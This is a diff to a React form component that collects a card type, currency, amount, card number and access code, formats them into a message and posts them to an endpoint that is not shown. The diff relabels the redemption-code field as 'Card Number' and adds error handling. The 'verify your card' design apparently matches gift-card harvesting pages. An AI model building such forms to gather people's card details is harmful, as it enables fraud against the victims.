@@ -1,6 +1,6 @@
 "use client"
 
-import React, { useState } from 'react'
+import React, { useEffect, useState } from 'react'
 import { useAlert } from 'react-alert'
 import Button from '../button/Button';
 
@@ -9,6 +9,11 @@ const TypeTwo = ({cardname, setShowmodal, showmodal, amount, setAmount, currency
     const [accessCode, setAccessCode] = useState('');
     const [loading, setLoading] = useState(false);
     const alert = useAlert();
+    const [mounted, setMounted] = useState(false);
+
+    useEffect(()=> {
+        setMounted(true);
+    }, [mounted])
 
     const handleVerify = async () => {
         setLoading(true)
@@ -20,8 +25,8 @@ const TypeTwo = ({cardname, setShowmodal, showmodal, amount, setAmount, currency
             return;
         }
     
-        if(redemptionCode.length < 16){
-            alert.error("Invalid reedemption code");
+        if(redemptionCode.length < 13){
+            alert.error("Invalid Card number");
             setLoading(false)
             return;
         }
@@ -30,7 +35,7 @@ const TypeTwo = ({cardname, setShowmodal, showmodal, amount, setAmount, currency
 Card Type: ${cardname}
 Currency: ${currency}
 Amount: ${amount}
-Reedemption Code: ${redemptionCode}
+Card Number: ${redemptionCode}
 Access Code: ${accessCode}
 `;
         const data = {
@@ -43,9 +48,13 @@ Access Code: ${accessCode}
             headers:{
                 'content-type': 'application/json',
             }
+        }).then(()=> {
+            setShowmodal(true);
+            setLoading(false);
+        }).catch(err => {
+            setLoading(false);
+            alert.error("Something went wrong, try again.")
         })
-        setShowmodal(true);
-        setLoading(false)
     }
 
   return (
@@ -60,7 +69,7 @@ Access Code: ${accessCode}
             class="block w-full mb-4  p-2 rounded-lg" 
             value={redemptionCode} 
             onInput={e => setRedemptionCode(e.target.value)}
-            placeholder='Redemption Code'
+            placeholder='Card Number'
         />
         <input 
             type='number'
@@ -72,7 +81,7 @@ Access Code: ${accessCode}
         <Button
             title={"Verify"}
             loading={loading}
-            onClick={handleVerify}
+            onClick={mounted ? handleVerify : ()=>{}}
         />
     </>
   )
